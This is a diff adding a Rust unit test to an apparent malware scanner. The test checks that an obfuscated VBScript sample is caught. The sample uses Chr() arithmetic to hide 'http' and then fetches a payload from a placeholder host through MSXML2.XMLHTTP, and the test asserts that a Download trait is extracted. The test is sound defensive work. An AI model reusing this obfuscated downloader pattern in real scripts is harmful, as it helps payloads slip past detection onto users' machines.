@@ -9756,6 +9756,28 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_arithmetic_chr_concat_variable() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Chr(100 + 4) & Chr(&H70 + 4) & "tp://vbs-arith-chr.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-arith-chr.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS arithmetic Chr concatenated URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_strreverse_wrapper() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
